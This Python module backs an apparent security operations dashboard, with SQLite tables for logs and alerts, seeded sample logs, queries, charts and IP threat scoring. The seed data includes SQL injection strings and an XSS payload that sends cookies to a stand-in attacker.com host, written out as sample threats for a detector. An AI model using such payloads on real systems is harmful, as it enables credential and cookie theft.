import sqlite3
import os
from datetime import datetime, timedelta
from detector import ThreatDetector

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'cybersoc.db')

def get_db_connection():
    """Establishes and returns a database connection with dict-like row factory."""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    """Initializes SQLite database tables and populates sample security logs if empty."""
    conn = get_db_connection()
    cursor = conn.cursor()

    # Create logs table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            source_ip TEXT,
            destination_ip TEXT,
            username TEXT,
            log_level TEXT,
            category TEXT,
            message TEXT,
            raw_log TEXT,
            is_threat INTEGER DEFAULT 0
        )
    ''')

    # Create alerts table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS alerts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT,
            alert_type TEXT,
            severity TEXT,
            source_ip TEXT,
            destination_ip TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            description TEXT,
            raw_log TEXT,
            recommended_action TEXT,
            status TEXT DEFAULT 'New',
            category TEXT,
            log_id INTEGER,
            FOREIGN KEY (log_id) REFERENCES logs (id)
        )
    ''')

    conn.commit()

    # Check if DB needs seeding
    cursor.execute("SELECT COUNT(*) as count FROM logs")
    count = cursor.fetchone()['count']
    if count == 0:
        seed_sample_data(conn)

    conn.close()

def seed_sample_data(conn):
    """Populates realistic cybersecurity logs across Critical, High, Medium, and Low severities."""
    cursor = conn.cursor()
    now = datetime.now()

    sample_logs = [
        # Critical Threats
        {
            "offset_mins": 5,
            "source_ip": "185.220.101.5",
            "destination_ip": "10.0.0.5",
            "username": "admin",
            "log_level": "CRITICAL",
            "category": "Web Security",
            "message": "SQL Injection attempt: GET /api/v1/users?id=1' OR '1'='1 -- HTTP/1.1",
            "raw_log": "2026-07-23T18:40:00Z [WAF-ALERT] 185.220.101.5 - - [GET /api/v1/users?id=1' OR '1'='1 --] 403 512 \"-\" \"Mozilla/5.0 (sqlmap/1.6#stable)\""
        },
        {
            "offset_mins": 12,
            "source_ip": "194.26.29.110",
            "destination_ip": "10.0.0.5",
            "username": "unknown",
            "log_level": "CRITICAL",
            "category": "Web Security",
            "message": "SQL Injection payload in POST /login body: username=admin' UNION SELECT username, password FROM admin_users--",
            "raw_log": "2026-07-23T18:33:00Z [NGINX-SEC] 194.26.29.110 POST /login HTTP/1.1 - SQLi Signature Matched: UNION SELECT"
        },
        {
            "offset_mins": 60,
            "source_ip": "103.152.220.10",
            "destination_ip": "10.0.0.2",
            "username": "root",
            "log_level": "CRITICAL",
            "category": "Authentication",
            "message": "Successful root login from external unrecognized IP 103.152.220.10 outside working hours",
            "raw_log": "2026-07-23T17:45:00Z sshd[3102]: Accepted password for root from 103.152.220.10 port 55102 ssh2 [SUSPICIOUS ROOT LOGIN]"
        },
        {
            "offset_mins": 75,
            "source_ip": "10.0.0.45",
            "destination_ip": "45.154.255.99",
            "username": "system",
            "log_level": "CRITICAL",
            "category": "Network Security",
            "message": "Outbound connection to known C2 server 45.154.255.99 port 4444 (Reverse Shell beacon pattern)",
            "raw_log": "2026-07-23T17:30:00Z [FIREWALL-EGRESS] Blocked session 10.0.0.45:49100 -> 45.154.255.99:4444 [C2 BEACON DETECTED]"
        },

        # High Threats
        {
            "offset_mins": 25,
            "source_ip": "45.146.164.20",
            "destination_ip": "10.0.0.5",
            "username": "victim_user",
            "log_level": "ERROR",
            "category": "Web Security",
            "message": "XSS attack detected in comment field: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
            "raw_log": "2026-07-23T18:20:00Z [APP-LOG] XSS payload intercepted in user comment field from IP 45.146.164.20"
        },
        {
            "offset_mins": 33,
            "source_ip": "185.220.101.5",
            "destination_ip": "10.0.0.10",
            "username": "admin",
            "log_level": "ERROR",
            "category": "Authentication",
            "message": "Failed password for user admin from 185.220.101.5 port 44215 ssh2 - Multiple failed logins detected",
            "raw_log": "2026-07-23T18:12:00Z sshd[4920]: Failed password for admin from 185.220.101.5 port 44215 ssh2 [BRUTE FORCE PATTERN]"
        },
        {
            "offset_mins": 90,
            "source_ip": "185.246.128.5",
            "destination_ip": "10.0.0.5",
            "username": "N/A",
            "log_level": "WARNING",
            "category": "Network Security",
            "message": "TOR Exit Node IP 185.246.128.5 probed web application endpoint /admin/config.php",
            "raw_log": "2026-07-23T17:15:00Z [WAF-TOR] Connection from TOR Exit Node 185.246.128.5 GET /admin/config.php"
        },

        # Medium Threats
        {
            "offset_mins": 45,
            "source_ip": "45.154.255.80",
            "destination_ip": "10.0.0.15",
            "username": "N/A",
            "log_level": "WARNING",
            "category": "Network Security",
            "message": "Nmap SYN scan detected: 1024 sequential TCP ports probed on host 10.0.0.15",
            "raw_log": "2026-07-23T18:00:00Z [IDS-SURICATA] 45.154.255.80 -> 10.0.0.15 [ET SCAN Nmap SYN scan probe detected]"
        },
        {
            "offset_mins": 50,
            "source_ip": "192.168.1.99",
            "destination_ip": "10.0.0.10",
            "username": "guest_user",
            "log_level": "WARNING",
            "category": "Authentication",
            "message": "Failed password for user guest_user from 192.168.1.99 port 51020 ssh2",
            "raw_log": "2026-07-23T17:55:00Z sshd[4110]: Failed password for guest_user from 192.168.1.99 port 51020 ssh2"
        },

        # Low Threats (Policy Warnings)
        {
            "offset_mins": 80,
            "source_ip": "192.168.1.105",
            "destination_ip": "10.0.0.8",
            "username": "intern_user",
            "log_level": "WARNING",
            "category": "System",
            "message": "Inbound FTP connection attempt using unencrypted cleartext credentials on port 21 from 192.168.1.105",
            "raw_log": "2026-07-23T17:25:00Z [POLICY-AUDIT] Deprecated protocol warning: FTP connection from 192.168.1.105"
        },
        {
            "offset_mins": 95,
            "source_ip": "192.168.1.110",
            "destination_ip": "10.0.0.5",
            "username": "dev_test",
            "log_level": "WARNING",
            "category": "System",
            "message": "HTTP cleartext password transmission policy warning from host 192.168.1.110",
            "raw_log": "2026-07-23T17:10:00Z [POLICY-AUDIT] Policy warning: Unencrypted traffic detected for user dev_test"
        },
        
        # Normal System & Network Logs
        {
            "offset_mins": 100,
            "source_ip": "192.168.1.45",
            "destination_ip": "10.0.0.5",
            "username": "john.doe",
            "log_level": "INFO",
            "category": "Authentication",
            "message": "User john.doe logged in successfully via SAML SSO from internal network",
            "raw_log": "2026-07-23T17:05:00Z [SSO-AUTH] User john.doe authenticated successfully (MFA verified)"
        },
        {
            "offset_mins": 115,
            "source_ip": "192.168.1.50",
            "destination_ip": "10.0.0.5",
            "username": "N/A",
            "log_level": "INFO",
            "category": "Web Security",
            "message": "HTTP GET /index.html 200 OK - 192.168.1.50 User-Agent: Chrome/120.0",
            "raw_log": "2026-07-23T16:50:00Z [NGINX-ACCESS] 192.168.1.50 - - [GET /index.html HTTP/1.1] 200 4096"
        },
        {
            "offset_mins": 130,
            "source_ip": "10.0.0.2",
            "destination_ip": "10.0.0.100",
            "username": "system",
            "log_level": "INFO",
            "category": "System",
            "message": "Automated night database backup completed successfully (size: 2.4 GB)",
            "raw_log": "2026-07-23T16:35:00Z [CRON-JOB] Backup job #8912 completed with status 0"
        },
        {
            "offset_mins": 150,
            "source_ip": "192.168.1.88",
            "destination_ip": "10.0.0.5",
            "username": "sarah.connor",
            "log_level": "INFO",
            "category": "Authentication",
            "message": "User sarah.connor updated account profile and password successfully",
            "raw_log": "2026-07-23T16:15:00Z [APP-AUDIT] Password change event confirmed for user sarah.connor"
        }
    ]

    for item in sample_logs:
        log_time = (now - timedelta(minutes=item["offset_mins"])).strftime('%Y-%m-%d %H:%M:%S')
        
        analysis = ThreatDetector.analyze_log(
            raw_log=item["raw_log"],
            source_ip=item["source_ip"],
            username=item["username"],
            category=item["category"]
        )

        is_threat = 1 if analysis["is_threat"] else 0

        cursor.execute('''
            INSERT INTO logs (timestamp, source_ip, destination_ip, username, log_level, category, message, raw_log, is_threat)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            log_time,
            item["source_ip"],
            item["destination_ip"],
            item["username"],
            item["log_level"],
            item["category"],
            item["message"],
            item["raw_log"],
            is_threat
        ))

        log_id = cursor.lastrowid

        if analysis["is_threat"]:
            status = "New"
            if "SQL" in analysis["alert_type"]:
                status = "Investigating"
            elif "Brute" in analysis["alert_type"] and item["offset_mins"] > 35:
                status = "Resolved"

            cursor.execute('''
                INSERT INTO alerts (title, alert_type, severity, source_ip, destination_ip, timestamp, description, raw_log, recommended_action, status, category, log_id)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                analysis["title"],
                analysis["alert_type"],
                analysis["severity"],
                item["source_ip"],
                item["destination_ip"],
                log_time,
                analysis["description"],
                item["raw_log"],
                analysis["recommended_action"],
                status,
                analysis["category"],
                log_id
            ))

    conn.commit()

def get_dashboard_stats():
    """Returns aggregated count statistics for SOC dashboard counters."""
    conn = get_db_connection()
    cursor = conn.cursor()

    cursor.execute("SELECT COUNT(*) as total_logs FROM logs")
    total_logs = cursor.fetchone()['total_logs']

    cursor.execute("SELECT COUNT(*) as critical FROM alerts WHERE severity = 'Critical'")
    critical = cursor.fetchone()['critical']

    cursor.execute("SELECT COUNT(*) as high FROM alerts WHERE severity = 'High'")
    high = cursor.fetchone()['high']

    cursor.execute("SELECT COUNT(*) as medium FROM alerts WHERE severity = 'Medium'")
    medium = cursor.fetchone()['medium']

    cursor.execute("SELECT COUNT(*) as low FROM alerts WHERE severity = 'Low'")
    low = cursor.fetchone()['low']

    cursor.execute("SELECT COUNT(*) as total_alerts FROM alerts")
    total_alerts = cursor.fetchone()['total_alerts']

    conn.close()

    return {
        "total_logs": total_logs,
        "total_alerts": total_alerts,
        "critical_alerts": critical,
        "high_alerts": high,
        "medium_alerts": medium,
        "low_alerts": low
    }

def get_recent_logs(limit=50, category_filter=None, threat_only=False):
    """Fetches recent security logs with optional filtering."""
    conn = get_db_connection()
    cursor = conn.cursor()

    query = "SELECT * FROM logs WHERE 1=1"
    params = []

    if category_filter:
        query += " AND category = ?"
        params.append(category_filter)
    if threat_only:
        query += " AND is_threat = 1"

    query += " ORDER BY timestamp DESC LIMIT ?"
    params.append(limit)

    cursor.execute(query, params)
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]

def get_all_alerts(severity_filter=None, status_filter=None):
    """Fetches alerts with optional severity or status filtering."""
    conn = get_db_connection()
    cursor = conn.cursor()

    query = "SELECT * FROM alerts WHERE 1=1"
    params = []

    if severity_filter and severity_filter != 'All':
        query += " AND severity = ?"
        params.append(severity_filter)

    if status_filter and status_filter != 'All':
        query += " AND status = ?"
        params.append(status_filter)

    query += " ORDER BY timestamp DESC"
    cursor.execute(query, params)
    rows = cursor.fetchall()
    conn.close()
    return [dict(row) for row in rows]

def get_alert_by_id(alert_id):
    """Fetches single alert details by ID."""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM alerts WHERE id = ?", (alert_id,))
    row = cursor.fetchone()
    conn.close()
    return dict(row) if row else None

def update_alert_status(alert_id, new_status):
    """Updates the resolution status of a security alert."""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("UPDATE alerts SET status = ? WHERE id = ?", (new_status, alert_id))
    conn.commit()
    conn.close()

def insert_new_log_and_analyze(source_ip, destination_ip, username, log_level, category, message, raw_log):
    """Inserts a new log entry, runs threat detector, and creates alert if threat detected."""
    conn = get_db_connection()
    cursor = conn.cursor()
    now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    analysis = ThreatDetector.analyze_log(
        raw_log=raw_log or message,
        source_ip=source_ip,
        username=username,
        category=category
    )

    is_threat = 1 if analysis["is_threat"] else 0

    cursor.execute('''
        INSERT INTO logs (timestamp, source_ip, destination_ip, username, log_level, category, message, raw_log, is_threat)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        now_str,
        source_ip or '127.0.0.1',
        destination_ip or '10.0.0.1',
        username or 'N/A',
        log_level or ('CRITICAL' if is_threat else 'INFO'),
        category or analysis.get('category', 'System'),
        message,
        raw_log or message,
        is_threat
    ))

    log_id = cursor.lastrowid
    created_alert_id = None

    if analysis["is_threat"]:
        cursor.execute('''
            INSERT INTO alerts (title, alert_type, severity, source_ip, destination_ip, timestamp, description, raw_log, recommended_action, status, category, log_id)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'New', ?, ?)
        ''', (
            analysis["title"],
            analysis["alert_type"],
            analysis["severity"],
            source_ip or '127.0.0.1',
            destination_ip or '10.0.0.1',
            now_str,
            analysis["description"],
            raw_log or message,
            analysis["recommended_action"],
            category or analysis.get('category', 'Security'),
            log_id
        ))
        created_alert_id = cursor.lastrowid

    conn.commit()
    conn.close()

    return {
        "log_id": log_id,
        "is_threat": analysis["is_threat"],
        "analysis": analysis,
        "alert_id": created_alert_id
    }

def get_chart_analytics():
    """Aggregates data dynamically for Chart.js dashboard widgets."""
    conn = get_db_connection()
    cursor = conn.cursor()

    # 1. Severity Distribution
    cursor.execute("SELECT severity, COUNT(*) as count FROM alerts GROUP BY severity")
    sev_rows = cursor.fetchall()
    sev_data = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0}
    for r in sev_rows:
        if r['severity'] in sev_data:
            sev_data[r['severity']] = r['count']

    # 2. Top Attack Types
    cursor.execute("SELECT alert_type, COUNT(*) as count FROM alerts GROUP BY alert_type ORDER BY count DESC LIMIT 6")
    attack_rows = cursor.fetchall()
    attack_types = [r['alert_type'] for r in attack_rows]
    attack_counts = [r['count'] for r in attack_rows]

    # 3. Top Suspicious IPs
    cursor.execute("SELECT source_ip, COUNT(*) as count FROM alerts GROUP BY source_ip ORDER BY count DESC LIMIT 5")
    ip_rows = cursor.fetchall()
    top_ips = [r['source_ip'] for r in ip_rows]
    ip_counts = [r['count'] for r in ip_rows]

    # 4. Activity Over Time (Grouped by timestamp hour/minute slots)
    cursor.execute("""
        SELECT strftime('%H:%M', timestamp) as time_slot, 
               COUNT(*) as total_logs,
               SUM(CASE WHEN is_threat = 1 THEN 1 ELSE 0 END) as threat_count
        FROM logs 
        GROUP BY time_slot 
        ORDER BY timestamp ASC 
        LIMIT 10
    """)
    timeline_rows = cursor.fetchall()
    timeline_labels = [r['time_slot'] or 'Now' for r in timeline_rows]
    timeline_total = [r['total_logs'] for r in timeline_rows]
    timeline_threats = [r['threat_count'] for r in timeline_rows]

    conn.close()

    return {
        "severity": sev_data,
        "attack_types": {"labels": attack_types, "counts": attack_counts},
        "top_ips": {"labels": top_ips, "counts": ip_counts},
        "timeline": {
            "labels": timeline_labels,
            "total_logs": timeline_total,
            "threats": timeline_threats
        }
    }
def get_ip_threat_intelligence(source_ip):
    """
    Returns threat intelligence summary for a specific source IP
    based on existing CyberSOC alert and log data.
    """
    conn = get_db_connection()
    cursor = conn.cursor()

    # Get all alerts associated with this IP
    cursor.execute("""
        SELECT *
        FROM alerts
        WHERE source_ip = ?
        ORDER BY timestamp DESC
    """, (source_ip,))

    alert_rows = cursor.fetchall()
    alerts = [dict(row) for row in alert_rows]

    # Get all logs associated with this IP
    cursor.execute("""
        SELECT *
        FROM logs
        WHERE source_ip = ?
        ORDER BY timestamp DESC
        LIMIT 20
    """, (source_ip,))

    log_rows = cursor.fetchall()
    logs = [dict(row) for row in log_rows]

    conn.close()

    # Calculate statistics
    alert_count = len(alerts)

    severity_counts = {
        "Critical": 0,
        "High": 0,
        "Medium": 0,
        "Low": 0
    }

    for alert in alerts:
        severity = alert.get("severity")
        if severity in severity_counts:
            severity_counts[severity] += 1

    # Calculate threat score
    threat_score = 0

    threat_score += severity_counts["Critical"] * 25
    threat_score += severity_counts["High"] * 15
    threat_score += severity_counts["Medium"] * 8
    threat_score += severity_counts["Low"] * 3

    # Limit score to 100
    threat_score = min(threat_score, 100)

    # Determine risk level
    if threat_score >= 70:
        risk_level = "Critical"
    elif threat_score >= 40:
        risk_level = "High"
    elif threat_score >= 15:
        risk_level = "Medium"
    elif threat_score > 0:
        risk_level = "Low"
    else:
        risk_level = "Unknown"

    # Recommended action
    if risk_level == "Critical":
        recommended_action = (
            "Immediately block the IP address at the firewall and investigate "
            "all associated security incidents."
        )
    elif risk_level == "High":
        recommended_action = (
            "Monitor the IP closely, review associated alerts, and consider "
            "blocking the IP at the perimeter firewall."
        )
    elif risk_level == "Medium":
        recommended_action = (
            "Continue monitoring the IP and investigate repeated suspicious activity."
        )
    elif risk_level == "Low":
        recommended_action = (
            "Monitor the IP for additional suspicious activity."
        )
    else:
        recommended_action = (
            "No known threat activity found in the CyberSOC database."
        )

    return {
        "ip": source_ip,
        "risk_level": risk_level,
        "threat_score": threat_score,
        "alert_count": alert_count,
        "severity_counts": severity_counts,
        "alerts": alerts,
        "logs": logs,
        "recommended_action": recommended_action
    }
